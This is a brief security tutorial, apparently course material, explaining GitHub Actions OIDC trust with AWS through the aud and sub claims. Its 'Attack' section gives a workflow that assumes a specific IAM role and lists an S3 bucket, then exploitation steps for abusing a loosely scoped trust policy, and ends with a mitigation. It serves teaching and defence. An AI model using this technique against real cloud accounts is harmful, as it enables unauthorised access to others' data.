What is GitHub Actions OIDC?
• OpenID Connect (OIDC) in GitHub Actions lets workflows authenticate to cloud providers (like AWS, Azure, GCP) without using long-lived secrets
• Instead of storing access keys, GitHub Actions can request a temporary token from GitHub’s identity provider, which the cloud provider trusts

## What is an OIDC Misconfiguration?
• It’s when a cloud provider (like AWS) trusts too much information from GitHub’s identity token or doesn’t strictly scope what GitHub workflows can assume which roles
• In short:
	• You gave GitHub too much trust without limiting who or what can use it

## Key Concepts in OIDC: Audience (aud) and Subject (sub) in GitHub Actions
**Audience (aud):**
The audience claim in an OIDC token defines who the token is intended for. It ensures that the token is only valid for the specified service.

In GitHub Actions OIDC usage, the audience is typically set to sts.amazonaws.com when interacting with AWS. This means the OIDC token is only intended for AWS’s Security Token Service (STS). AWS uses this to verify that the token was meant for them and prevents any misuse outside the intended service.

Example:
- "aud": "sts.amazonaws.com"
This ensures that the token is specifically used for AWS role assumption via the sts:AssumeRoleWithWebIdentity action.

**Subject (sub):**
The subject claim represents the entity (user, app, or service) that the token is being issued for. In GitHub Actions OIDC, the sub claim often includes information about the repository that triggered the workflow, the branch, and sometimes the specific event.

The typical format for the sub claim is: repo:`<organization>/<repository>:ref/heads/<branch>`

This ensures that only workflows running from a specific repository and branch are allowed to assume a particular AWS role.

Example of a sub claim: "sub": "repo:MyOrg/MyRepo:ref/heads/main"

In this case:
- repo:MyOrg/MyRepo: The repository MyRepo in the organization MyOrg. 
- ref/heads/main: The workflow is running on the main branch.
## Attack
```yml
name: List S3

on:
  push:
    branches: ["main"]
permissions:
  contents: read

jobs:
  read:
    name: "LS aws s3"
    runs-on: ubuntu-latest
    # These permissions are needed to interact with GitHub's OIDC Token endpoint.
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Configure AWS credentials from Test account
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::715841334827:role/GA-oidc
          aws-region: us-east-1
      - name: Copy files to the test website with the AWS CLI
        run: |
          aws s3 ls s3://cidccourse-oidc-s3

```

### Exploitation Steps
1. The attacker identifies the vulnerable repository setup containing the ARN.
2. The attacker creates a repository matching the naming conventions allowed by the trust policy (i.e., repository name same as the vulnerable one).
3. They push code that triggers the vulnerable GitHub Actions workflow to assume the role.
4. The workflow assumes the role and allows the attacker to list the contents of the cidccourse-oidc-s3 bucket.
## Mitigation
Limit OIDC Trust Policies:
• Scope the token.actions.githubusercontent.com:sub to a specific repository or organization to prevent wildcard-based attacks.